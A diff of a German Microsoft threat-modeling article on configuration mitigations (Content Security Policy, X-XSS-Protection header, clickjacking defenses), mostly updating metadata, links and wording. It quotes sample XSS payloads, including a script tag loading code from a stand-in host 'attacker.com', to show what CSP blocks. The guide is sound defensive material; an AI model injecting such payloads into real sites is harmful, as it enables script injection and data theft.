@@ -16,12 +16,12 @@ ms.devlang: na
 ms.topic: article
 ms.date: 02/07/2017
 ms.author: jegeib
-ms.openlocfilehash: 3c89fae09583c96cf8139885fe2554cf6784b4e3
-ms.sourcegitcommit: 2ec4b3d0bad7dc0071400c2a2264399e4fe34897
+ms.openlocfilehash: 499e4cb2cb62ccc170637bad60898b38b4ff3be7
+ms.sourcegitcommit: 67bddb15f90fb7e845ca739d16ad568cbc368c06
 ms.translationtype: HT
 ms.contentlocale: de-DE
-ms.lasthandoff: 03/28/2020
-ms.locfileid: "78269819"
+ms.lasthandoff: 04/28/2020
+ms.locfileid: "82204252"
 ---
 # <a name="security-frame-configuration-management--mitigations"></a>Sicherheitsrahmen: Konfigurationsverwaltung | Risikominderung 
 | Produkt/Dienst | Artikel |
@@ -45,7 +45,7 @@ ms.locfileid: "78269819"
 | **Zutreffende Technologien** | Allgemein |
 | **Attribute**              | –  |
 | **Referenzen**              | [An Introduction to Content Security Policy](https://www.html5rocks.com/en/tutorials/security/content-security-policy/) (Eine Einführung in die Inhaltssicherheitsrichtlinie), [Content Security Policy Reference](https://content-security-policy.com/) (Referenz für die Inhaltssicherheitsrichtlinie), [Security features](https://developer.microsoft.com/microsoft-edge/platform/documentation/dev-guide/security/) (Sicherheitsfeatures), [Introduction to content security policy](https://github.com/webplatform/webplatform.github.io/tree/master/docs/tutorials/content-security-policy) (Einführung in die Inhaltssicherheitsrichtlinie), [Can I use CSP?](https://caniuse.com/#feat=contentsecuritypolicy) (Kann ich die Inhaltssicherheitsrichtlinie verwenden?) |
-| **Schritte** | <p>Die Inhaltssicherheitsrichtlinie (Content Security Policy, CSP) ist ein umfassender defensiver Sicherheitsmechanismus – ein W3C-Standard, mit dem Besitzer von Webanwendungen den in Ihre Website eingebetteten Inhalt steuern können. CSP wird auf dem Webserver als HTTP-Antwortheader hinzugefügt und clientseitig vom Browser erzwungen. Die Richtlinie basiert auf einer Positivliste: Eine Website kann einen Satz vertrauenswürdiger Domänen deklarieren, aus denen aktive Inhalte wie etwa JavaScript geladen werden können.</p><p>CSP bietet folgende Sicherheitsvorteile:</p><ul><li>**Schutz vor XSS**:  Wenn eine Seite für XSS anfällig ist, kann dies von einem Angreifer auf zwei Arten ausgenutzt werden:<ul><li>Der Angreifer kann `<script>malicious code</script>` einschleusen. Dieser Exploit funktioniert dank der Basiseinschränkung 1 von CSP nicht.</li><li>Der Angreifer kann `<script src="http://attacker.com/maliciousCode.js"/>` einschleusen. Dieser Exploit funktioniert nicht, da die vom Angreifer gesteuerte Domäne nicht in der CSP-Positivliste mit zulässigen Domänen enthalten ist.</li></ul></li><li>**Kontrolle über die Ausschleusung von Daten**: Wenn schädlicher Inhalt auf einer Webseite versucht, eine Verbindung mit einer externen Website herzustellen und Daten zu stehlen, wird die Verbindung von CSP getrennt. Der Grund: Die Zieldomäne ist nicht in der Positivliste von CSP enthalten.</li><li>**Schutz vor Clickjacking:** Bei einem Clickjacking-Angriff kann ein Angreifer eine Originalwebsite mit einem Frame versehen und Benutzer zum Klicken auf Benutzeroberflächenelemente bewegen. Zum Schutz vor Clickjacking wird momentan ein Antwortheader mit X-Frame-Optionen konfiguriert. Dieser Header wird nicht von allen Browsern beachtet, und in Zukunft wird CSP als eine der Standardmaßnahmen gegen Clickjacking verwendet.</li><li>**Echtzeitberichte zu Angriffen**: Bei einem Einschleusungsangriff auf eine CSP-fähige Website benachrichtigt der Browser automatisch einen für den Webserver konfigurierten Endpunkt. Somit fungiert CSP als Echtzeitwarnsystem.</li></ul> |
+| **Schritte** | <p>Die Inhaltssicherheitsrichtlinie (Content Security Policy, CSP) ist ein umfassender defensiver Sicherheitsmechanismus – ein W3C-Standard, mit dem Besitzer von Webanwendungen den in Ihre Website eingebetteten Inhalt steuern können. CSP wird auf dem Webserver als HTTP-Antwortheader hinzugefügt und clientseitig vom Browser erzwungen. Die Richtlinie basiert auf einer Positivliste: Eine Website kann einen Satz vertrauenswürdiger Domänen deklarieren, aus denen aktive Inhalte wie etwa JavaScript geladen werden können.</p><p>CSP bietet folgende Sicherheitsvorteile:</p><ul><li>**Schutz vor XSS**:  Wenn eine Seite für XSS anfällig ist, kann dies von einem Angreifer auf zwei Arten ausgenutzt werden:<ul><li>Der Angreifer kann `<script>malicious code</script>` einschleusen. Dieser Exploit funktioniert aufgrund der Basiseinschränkung 1 von CSP nicht.</li><li>Der Angreifer kann `<script src="http://attacker.com/maliciousCode.js"/>` einschleusen. Dieser Exploit funktioniert nicht, da die vom Angreifer gesteuerte Domäne nicht in der CSP-Positivliste mit zulässigen Domänen enthalten ist.</li></ul></li><li>**Kontrolle über die Ausschleusung von Daten**: Wenn schädlicher Inhalt auf einer Webseite versucht, eine Verbindung mit einer externen Website herzustellen und Daten zu stehlen, wird die Verbindung von CSP getrennt. Dies liegt daran, dass die Zieldomäne nicht in der CSP-Positivliste enthalten ist.</li><li>**Schutz vor Clickjacking:** Bei einem Clickjacking-Angriff kann ein Angreifer eine Originalwebsite mit einem Frame versehen und Benutzer zum Klicken auf Benutzeroberflächenelemente bewegen. Zum Schutz vor Clickjacking wird momentan ein Antwortheader mit X-Frame-Optionen konfiguriert. Dieser Header wird nicht von allen Browsern beachtet, und in Zukunft wird CSP als eine der Standardmaßnahmen gegen Clickjacking verwendet.</li><li>**Echtzeitberichte zu Angriffen**: Bei einem Einschleusungsangriff auf eine CSP-fähige Website benachrichtigt der Browser automatisch einen für den Webserver konfigurierten Endpunkt. Somit fungiert CSP als Echtzeitwarnsystem.</li></ul> |
 
 ### <a name="example"></a>Beispiel
 Beispielrichtlinie: 
@@ -76,7 +76,7 @@ Example: var str="alert(1)"; eval(str);
 | **SDL-Phase**               | Entwickeln |  
 | **Zutreffende Technologien** | Allgemein |
 | **Attribute**              | –  |
-| **Referenzen**              | [XSS Protection Filter](https://www.owasp.org/index.php/List_of_useful_HTTP_headers#X-XSS-Protection) (XSS-Schutzfilter) |
+| **Referenzen**              | [XSS Protection Filter](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html) (XSS-Schutzfilter) |
 | **Schritte** | <p>Die Konfiguration des X-XSS-Protection-Antwortheaders steuert den websiteübergreifenden Skriptfilter des Browsers. Dieser Antwortheader kann folgende Werte besitzen:</p><ul><li>`0:`: Deaktiviert den Filter.</li><li>`1: Filter enabled`: Wenn ein Angriff mit websiteübergreifendem Skripting erkannt wird, wird die Seite vom Browser bereinigt, um den Angriff abzuwehren.</li><li>`1: mode=block : Filter enabled`. Bei Erkennung eines XSS-Angriffs verhindert der Browser das Rendern der Seite, anstatt die Seite zu bereinigen.</li><li>`1: report=http://[YOURDOMAIN]/your_report_URI : Filter enabled`. Der Browser bereinigt die Seite und meldet die Verletzung.</li></ul><p>Hierbei handelt es sich um eine Chromium-Funktion, die CSP-Verletzungsberichte verwendet, um Details an einen URI Ihrer Wahl zu senden. Die letzten beiden Optionen werden als sichere Werte betrachtet.</p>|
 
 ## <a name="aspnet-applications-must-disable-tracing-and-debugging-prior-to-deployment"></a><a id="trace-deploy"></a>ASP.NET-Anwendungen müssen vor der Bereitstellung die Ablaufverfolgung und das Debugging deaktivieren.
@@ -99,7 +99,7 @@ Example: var str="alert(1)"; eval(str);
 | **Zutreffende Technologien** | Allgemein |
 | **Attribute**              | –  |
 | **Referenzen**              | –  |
-| **Schritte** | Auf Drittanbieter-JavaScripts darf nur verwiesen werden, wenn diese aus vertrauenswürdigen Quellen stammen. Die Verweisendpunkte müssen immer SSL verwenden. |
+| **Schritte** | Auf Drittanbieter-JavaScripts darf nur verwiesen werden, wenn diese aus vertrauenswürdigen Quellen stammen. Die Verweisendpunkte müssen immer TLS verwenden. |
 
 ## <a name="ensure-that-authenticated-aspnet-pages-incorporate-ui-redressing-or-click-jacking-defenses"></a><a id="ui-defenses"></a>Stellen Sie sicher, dass authentifizierte ASP.NET-Seiten gegen UI Redressing und Clickjacking geschützt sind.
 
@@ -109,7 +109,7 @@ Example: var str="alert(1)"; eval(str);
 | **SDL-Phase**               | Entwickeln |  
 | **Zutreffende Technologien** | Allgemein |
 | **Attribute**              | –  |
-| **Referenzen**              | [OWASP Clickjacking Defense Cheat Sheet](https://www.owasp.org/index.php/Clickjacking_Defense_Cheat_Sheet) (OWASP-Cheat Sheet zur Abwehr von Clickjacking), [IE Internals - Combating ClickJacking With X-Frame-Options](https://blogs.msdn.microsoft.com/ieinternals/2010/03/30/combating-clickjacking-with-x-frame-options/) (IE intern – Abwehren von Clickjacking mit X-Frame-Optionen) |
+| **Referenzen**              | [OWASP Clickjacking Defense Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html) (OWASP-Cheat Sheet zur Abwehr von Clickjacking), [IE Internals - Combating ClickJacking With X-Frame-Options](https://blogs.msdn.microsoft.com/ieinternals/2010/03/30/combating-clickjacking-with-x-frame-options/) (IE intern – Abwehren von Clickjacking mit X-Frame-Optionen) |
 | **Schritte** | <p>Beim Clickjacking (oder UI Redressing) verwendet ein Angreifer mehrere transparente oder undurchsichtige Ebenen, um einen Benutzer dazu zu bringen, auf eine Schaltfläche oder auf einen Link auf einer anderen Seite zu klicken, obwohl der Benutzer eigentlich mit der Seite auf der obersten Ebene interagieren wollte.</p><p>Zur Erstellung dieser Ebenenstruktur wird eine schädliche Seite mit einem IFrame erstellt, der die Seite des Opfers lädt. Dadurch „kapert“ der Angreifer Klicks, die eigentlich für die ursprüngliche Seite gedacht waren, und leitet sie auf eine andere Seite um, die wahrscheinlich zu einer anderen Anwendung und/oder zu einer anderen Domäne gehört. Legen Sie zur Verhinderung von Clickjacking-Angriffen die richtigen X-Frame-Options-HTTP-Antwortheader fest, die den Browser anweisen, kein Framing von anderen Domänen zuzulassen.</p>|
 
 ### <a name="example"></a>Beispiel
